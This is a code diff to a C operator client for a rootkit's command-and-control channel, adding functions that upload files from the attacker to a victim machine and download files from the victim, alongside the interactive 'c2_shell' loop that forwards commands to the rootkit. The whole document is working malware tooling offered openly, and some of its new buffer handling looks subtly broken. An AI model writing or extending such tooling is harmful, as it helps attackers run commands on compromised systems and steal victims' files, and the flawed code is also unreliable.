@@ -9,6 +9,8 @@
 #include <time.h>
 #include <termios.h>
 #include <unistd.h>
+#include <sys/stat.h>
+#include <errno.h>
 
 #define BUF_SIZE     256
 #define FNV1A_OFFSET 2166136261U
@@ -101,6 +103,144 @@ static int wait_for_command_or_disconnect(int client_fd)
         if (FD_ISSET(STDIN_FILENO, &readfds))
             return 1;
     }
+}
+
+/* Upload file from attacker to victim */
+static int upload_file(int client_fd, const char *local_path, const char *remote_filename)
+{
+    FILE *fp;
+    char cmd[512];
+    char buf[4096];
+    size_t bytes_read;
+    long file_size = 0;
+    char *file_data;
+    
+    /* Open file to get size */
+    fp = fopen(local_path, "rb");
+    if (!fp) {
+        perror("fopen");
+        printf("[-] Cannot open file: %s\n", local_path);
+        return -1;
+    }
+    
+    /* Get file size */
+    fseek(fp, 0, SEEK_END);
+    file_size = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+    
+    if (file_size <= 0) {
+        printf("[-] File is empty or cannot determine size\n");
+        fclose(fp);
+        return -1;
+    }
+    
+    /* Allocate buffer and read entire file */
+    file_data = malloc(file_size);
+    if (!file_data) {
+        perror("malloc");
+        fclose(fp);
+        return -1;
+    }
+    
+    bytes_read = fread(file_data, 1, file_size, fp);
+    fclose(fp);
+    
+    if (bytes_read != file_size) {
+        printf("[-] Failed to read entire file\n");
+        free(file_data);
+        return -1;
+    }
+    
+    /* Send UPLOAD command with filename and size */
+    snprintf(cmd, sizeof(cmd), "UPLOAD %s %ld\n", remote_filename, file_size);
+    if (write_all(client_fd, cmd, strlen(cmd)) < 0) {
+        perror("write UPLOAD command");
+        free(file_data);
+        return -1;
+    }
+    
+    /* Send file content */
+    if (write_all(client_fd, file_data, file_size) < 0) {
+        perror("write file data");
+        free(file_data);
+        return -1;
+    }
+    
+    /* Send newline to signal end */
+    if (write_all(client_fd, "\n", 1) < 0) {
+        perror("write newline");
+        free(file_data);
+        return -1;
+    }
+    
+    free(file_data);
+    printf("[+] File uploaded successfully (%ld bytes)\n", file_size);
+    return 0;
+}
+
+/* Download file from victim to attacker */
+static int download_file(int client_fd, const char *remote_path, const char *local_path)
+{
+    FILE *fp;
+    char cmd[512];
+    char buf[4096];
+    ssize_t n;
+    size_t file_size = 0;
+    
+    /* Send DOWNLOAD command */
+    snprintf(cmd, sizeof(cmd), "DOWNLOAD %s\n", remote_path);
+    if (write_all(client_fd, cmd, strlen(cmd)) < 0) {
+        perror("write DOWNLOAD command");
+        return -1;
+    }
+    
+    /* Open local file for writing */
+    fp = fopen(local_path, "wb");
+    if (!fp) {
+        perror("fopen");
+        return -1;
+    }
+    
+    /* Read file data until marker */
+    char tail[64] = { 0 };
+    char combined[BUF_SIZE + sizeof(tail)];
+    const char *marker = "--- End of Output ---\n\n";
+    
+    while (1) {
+        memset(buf, 0, sizeof(buf));
+        n = read(client_fd, buf, sizeof(buf) - 1);
+        if (n <= 0) {
+            printf("\n[!] Connection lost\n");
+            fclose(fp);
+            return -1;
+        }
+        
+        /* Check for end marker */
+        snprintf(combined, sizeof(combined), "%s%s", tail, buf);
+        char *pos = strstr(combined, marker);
+        if (pos) {
+            size_t bytes_before_marker = pos - combined;
+            if (bytes_before_marker > strlen(tail)) {
+                fwrite(combined + strlen(tail), 1, bytes_before_marker - strlen(tail), fp);
+                file_size += bytes_before_marker - strlen(tail);
+            }
+            break;
+        }
+        
+        /* Write data before tail */
+        if (strlen(tail) > 0) {
+            fwrite(tail, 1, strlen(tail), fp);
+            file_size += strlen(tail);
+        }
+        
+        /* Keep last 64 bytes as tail */
+        strncpy(tail, combined + strlen(combined) - 63, 63);
+        tail[63] = '\0';
+    }
+    
+    fclose(fp);
+    printf("[+] File downloaded successfully (%zu bytes)\n", file_size);
+    return 0;
 }
 
 static int read_password(char *buf, size_t size)
@@ -233,74 +373,109 @@ int main(int argc, char **argv)
         printf("Type your command and press Enter. Type 'exit' to quit.\n\n");
 
         while (1) {
-            int ready;
-            int connection_lost = 0;
+    int ready;
+    int connection_lost = 0;
 
-            printf("c2_shell> ");
-            fflush(stdout);
+    printf("c2_shell> ");
+    fflush(stdout);
 
-            ready = wait_for_command_or_disconnect(client_fd);
-            if (ready <= 0) {
-                if (ready == 0)
-                    printf("\n[!] Connection lost or rootkit disconnected.\n");
-                break;
-            }
+    ready = wait_for_command_or_disconnect(client_fd);
+    if (ready <= 0) {
+        if (ready == 0)
+            printf("\n[!] Connection lost or rootkit disconnected.\n");
+        break;
+    }
 
-            /* 1. Read command from operator terminal */
-            if (fgets(buf, sizeof(buf), stdin) == NULL) {
-                break;
-            }
+    /* 1. Read command from operator terminal */
+    if (fgets(buf, sizeof(buf), stdin) == NULL) {
+        break;
+    }
 
-            if (strncmp(buf, "exit", 4) == 0) {
-                printf("Exiting interactive shell...\n");
-                break;
-            }
+    if (strncmp(buf, "exit", 4) == 0) {
+        printf("Exiting interactive shell...\n");
+        break;
+    }
 
-            if (buf[0] == '\n') {
-                continue;
-            }
-
-            /* 2. Forward the command payload to the rootkit module */
-            if (write_all(client_fd, buf, strlen(buf)) < 0) {
-                printf("\n[!] Connection lost or rootkit disconnected.\n");
-                break;
-            }
-
-            /* 3. Read stream until the specific end of output marker is detected */
-            {
-                char tail[32] = { 0 };
-                char combined[BUF_SIZE + sizeof(tail)];
-
-                while (1) {
-                    ssize_t n;
-
-                    memset(buf, 0, sizeof(buf));
-                    n = read(client_fd, buf, sizeof(buf) - 1);
-                    if (n <= 0) {
-                        printf("\n[!] Connection lost or rootkit disconnected.\n");
-                        connection_lost = 1;
-                        break;
-                    }
-
-                    buf[n] = '\0';
-                    printf("%s", buf);
-                    fflush(stdout);
-
-                    /* Check sentinel across chunk boundary to handle TCP fragmentation */
-                    snprintf(combined, sizeof(combined), "%s%s", tail, buf);
-                    if (strstr(combined, "--- End of Output ---\n\n") != NULL)
-                        break;
-
-                    size_t copy_len = (size_t)n < sizeof(tail) - 1
-                                      ? (size_t)n : sizeof(tail) - 1;
-                    memcpy(tail, buf + n - copy_len, copy_len);
-                    tail[copy_len] = '\0';
-                }
-            }
-
-            if (connection_lost)
-                break;
+    /* NEW: Handle UPLOAD command */
+    if (strncmp(buf, "UPLOAD ", 7) == 0) {
+        char local_path[256], remote_filename[256];
+        if (sscanf(buf, "UPLOAD %255s %255s", local_path, remote_filename) == 2) {
+            upload_file(client_fd, local_path, remote_filename);
+        } else {
+            printf("Usage: UPLOAD <local_path> <remote_filename>\n");
         }
+        continue;
+    }
+
+    /* NEW: Handle DOWNLOAD command */
+    if (strncmp(buf, "DOWNLOAD ", 9) == 0) {
+        char remote_path[256], local_path[256];
+        if (sscanf(buf, "DOWNLOAD %255s %255s", remote_path, local_path) == 2) {
+            download_file(client_fd, remote_path, local_path);
+        } else {
+            printf("Usage: DOWNLOAD <remote_path> <local_path>\n");
+        }
+        continue;
+    }
+
+    if (buf[0] == '\n') {
+        continue;
+    }
+
+    /* 2. Forward the command payload to the rootkit module */
+    if (write_all(client_fd, buf, strlen(buf)) < 0) {
+        printf("\n[!] Connection lost or rootkit disconnected.\n");
+        break;
+    }
+
+    /* 3. Read stream until the specific end of output marker is detected */
+    {
+        char tail[32] = { 0 };
+        char combined[BUF_SIZE + sizeof(tail)];
+
+        while (1) {
+            ssize_t n;
+
+            memset(buf, 0, sizeof(buf));
+            n = read(client_fd, buf, sizeof(buf) - 1);
+            if (n <= 0) {
+                printf("\n[!] Connection lost or rootkit disconnected.\n");
+                connection_lost = 1;
+                break;
+            }
+
+            snprintf(combined, sizeof(combined), "%s%s", tail, buf);
+            char *end_marker = strstr(combined, "--- End of Output ---\n\n");
+            if (end_marker) {
+                size_t len = end_marker - combined;
+                if (len > strlen(tail)) {
+                    fwrite(combined + strlen(tail), 1, len - strlen(tail), stdout);
+                }
+                printf("\n");
+                break;
+            }
+
+            if (strlen(tail) > 0) {
+                fwrite(tail, 1, strlen(tail), stdout);
+                fflush(stdout);
+            }
+
+            size_t buf_len = strlen(buf);
+            if (buf_len > 31) {
+                strncpy(tail, buf + buf_len - 31, 31);
+                tail[31] = '\0';
+                fwrite(buf, 1, buf_len - 31, stdout);
+                fflush(stdout);
+            } else {
+                strncpy(tail, combined, strlen(combined) > 31 ? 31 : strlen(combined));
+                tail[31] = '\0';
+            }
+        }
+
+        if (connection_lost)
+            break;
+    }
+}
 
         timestamp();
         printf("[-] Rootkit disconnected\n");
